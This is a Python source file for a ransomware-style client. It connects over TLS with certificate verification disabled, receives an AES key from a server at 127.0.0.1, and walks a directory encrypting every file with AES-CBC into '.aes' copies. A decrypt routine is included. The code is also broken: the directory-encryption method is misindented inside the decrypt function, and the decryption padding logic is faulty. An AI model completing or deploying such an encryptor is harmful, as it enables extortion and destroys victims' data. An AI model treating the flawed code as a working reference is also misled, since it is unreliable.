from socket import *
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os

class my_client:
    def __init__(self, HOST, PORT):
        context = ssl.create_default_context()
        # If using self-signed certificates, you can disable verification for testing:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = create_connection((HOST, PORT))
        self.ssock = context.wrap_socket(sock, server_hostname=HOST)
        # with socket.create_connection((HOST, PORT)) as sock:
        #     with context.wrap_socket(sock, server_hostname=HOST) as self.ssock:
        #         self.send_receive_message("Hello client!")

    def send_receive_message(self, msg):
        print(f"sending message => {msg}")
        self.ssock.sendall(msg.encode())

        key_bytes = self.ssock.recv(1024)
        print(f"Received key bytes: {key_bytes}")

        directory_path = "..." # Specify the directory to encrypt
        self.encrypt_all(directory_path, key_bytes)
        self.ssock.close()
        
    def encrypt_file(self, file_path, key_bytes):
        # AES requires a 16-byte IV
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()

        encrypted_file_path = file_path + ".aes"
        try:
            with open(file_path, "rb") as f_in, open(encrypted_file_path, "wb") as f_out:
                f_out.write(iv)  # Write IV at the start of the file
                while True:
                    chunk = f_in.read(1024)
                    if len(chunk) == 0:
                        break
                    padded_data = padder.update(chunk)
                    if padded_data:
                        encrypted_chunk = encryptor.update(padded_data)
                        f_out.write(encrypted_chunk)
                # Finalize padding and encryption
                padded_data = padder.finalize()
                if padded_data:
                    f_out.write(encryptor.update(padded_data))
                f_out.write(encryptor.finalize())
            print(f"File encrypted: {encrypted_file_path}")
        except Exception as e:
            print(f"Encryption failed: {e}")

    def decrypt_file(self, encrypted_file_path, decrypted_file_path, key_bytes):
        try:
            with open(encrypted_file_path, "rb") as f_in:
                iv = f_in.read(16)  # Read the IV from the beginning of the file
                cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
                decryptor = cipher.decryptor()
                unpadder = padding.PKCS7(128).unpadder()
                
                with open(decrypted_file_path, "wb") as f_out:
                    while True:
                        chunk = f_in.read(1024)
                        if len(chunk) == 0:
                            break
                        decrypted_chunk = decryptor.update(chunk)
                        if decrypted_chunk:
                            f_out.write(unpadder.update(decrypted_chunk))
                    decrypted_chunk = decryptor.finalize()
                    if decrypted_chunk:
                        f_out.write(unpadder.update(decrypted_chunk))
                    f_out.write(unpadder.finalize())
            print(f"File decrypted: {decrypted_file_path}")
        except Exception as e:
            print(f"Decryption failed: {e}")

        def encrypt_all(self,directory,key_bytes):
            for dirpath, dirnames, filenames in os.walk(directory):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    self.encrypt_file(file_path, key_bytes)
                    print(f"Encrypted {file_path}")

            print("All files encrypted.")
if __name__ == "__main__":
    client = my_client("127.0.0.1", 12345)
    client.send_receive_message("HELLO SERVER!")